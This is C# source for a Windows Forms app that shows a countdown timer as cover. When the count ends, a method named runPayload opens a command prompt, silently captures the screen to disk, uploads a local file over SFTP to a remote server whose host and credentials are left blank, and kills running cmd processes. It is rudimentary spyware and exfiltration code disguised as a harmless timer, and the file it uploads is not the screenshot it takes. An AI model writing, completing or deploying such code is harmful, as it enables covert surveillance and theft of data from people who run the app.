using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing.Imaging;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;
using System.Diagnostics;
using System.Net.Sockets;
using System.Net;

using Renci.SshNet;

namespace WindowsFormApp1
{
    public partial class Form1 : Form
    {

        public bool stopCount = false;
        public int aNumber;

        private static string host = "";
        private static string username = "";
        private static string password = "";

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            aNumber = 20;
            message.Visible = false;
            this.Icon = new Icon("favicon.ico");

        }

        private void label1_Click(object sender, EventArgs e)
        {
        
        }

        private void timer1_Tick_1(object sender, EventArgs e)
        {

            timer.Text = "Timer: " + aNumber;
            aNumber--;

            if (aNumber == 0)
            {
                stopCount = true;
            }
            if (stopCount)
            {
                aNumber = 0;
                timer.Visible = false;
                message.Visible = true;

                runPayload();
            }
        }

        public void runPayload()
        {  
            if (stopCount)
            {
                string strCmdText;
                strCmdText = "/K ipconfig";
                System.Diagnostics.Process.Start("CMD.exe", strCmdText);
                Thread.Sleep(250);
                CaptureScreen();

                Form1.SendFile("myFile.txt");

                Process[] runningProcess = Process.GetProcesses();
                for (int i=0; i<runningProcess.Length; i++)
                {
                    if (runningProcess[i].ProcessName == "cmd")
                    {
                        Thread.Sleep(1000);
                        runningProcess[i].Kill();
                    }
                }
            }
        }

        public void CaptureScreen()
        {
            try
            {

                Bitmap captureBitmap = new Bitmap(1920, 1080, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
                Rectangle captureRectangle = Screen.AllScreens[0].Bounds;

                Graphics captureGraphics = Graphics.FromImage(captureBitmap);
                captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);

                captureBitmap.Save(@"D:\Capture.jpg", ImageFormat.Jpeg);

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        public static int SendFile(string fileName)
        {
            var connectionInfo = new ConnectionInfo(host, "sftp", new PasswordAuthenticationMethod(username, password));

            // Upload File
            using (var sftp = new SftpClient(connectionInfo))
            {
                sftp.Connect();
                using (var uplfileStream = System.IO.File.OpenRead(fileName))
                {
                    sftp.UploadFile(uplfileStream, fileName, true); 
                }
                sftp.Disconnect();
            }
            return 0;
        }   
    }
}
